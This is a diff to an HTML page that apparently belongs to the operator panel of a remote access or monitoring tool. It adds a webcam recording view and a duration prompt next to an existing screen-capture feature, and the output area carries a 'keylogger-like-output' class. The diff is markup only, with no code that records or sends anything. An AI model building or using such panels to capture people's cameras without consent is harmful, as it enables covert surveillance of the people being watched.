@@ -41,6 +41,10 @@
                         <i data-feather="camera"></i>
                         <span>Screen Capture</span>
                     </li>
+                    <li class="nav-item" data-view="webcam">
+                        <i data-feather="video"></i>
+                        <span>Webcam</span>
+                    </li>
                 </ul>
                 
                 <ul class="nav-list-bottom">
@@ -164,6 +168,26 @@
                     <pre id="help-content"></pre>
                 </div>
                 
+                <div class="content-view" id="view-webcam">
+                    <div class="content-toolbar">
+                        <h2>Webcam Record</h2>
+                        <div class="button-group">
+                            <button class="btn btn-primary" id="btn-start-record">
+                                <i data-feather="video"></i> Start Record
+                            </button>
+                            <button class="btn btn-danger hidden" id="btn-stop-record">
+                                <i data-feather="stop-circle"></i> Cancel Request
+                            </button>
+                        </div>
+                    </div>
+                    
+                    <div id="webcam-display-area" class="keylogger-like-output">
+                        <p id="webcam-placeholder">Click "Start Record" to begin capturing a video clip (e.g., 5-10 seconds).</p>
+                        <div id="webcam-spinner" class="spinner hidden"></div>
+                        <video id="webcam-video-output" controls class="hidden"></video>
+                        <p id="webcam-status" class="warning-text hidden">Status: Idle</p>
+                    </div>
+                </div>
             </section>
         </div>
 
@@ -217,5 +241,21 @@
         </div>
     </div>
 
+    <div id="modal-webcam-device" class="modal hidden">
+        <h2>Start Webcam Recording</h2>
+        <p>Enter the recording duration in seconds (e.g., 5-10 seconds) and the optional device name.</p>
+        <div class="form-group">
+            <label for="input-webcam-duration">Duration (Seconds, required)</label>
+            <input type="number" id="input-webcam-duration" placeholder="e.g., 10" value="10" min="1">
+        </div>
+        <div class="form-group">
+            <label for="input-webcam-device-name">Device Name (Optional)</label>
+            <input type="text" id="input-webcam-device-name" placeholder="Leave blank for default">
+        </div>
+        <div class="modal-actions">
+            <button class="btn" data-action="cancel">Cancel</button>
+            <button class="btn btn-primary" data-action="confirm">Start Recording</button>
+        </div>
+    </div>
 </body>
 </html>
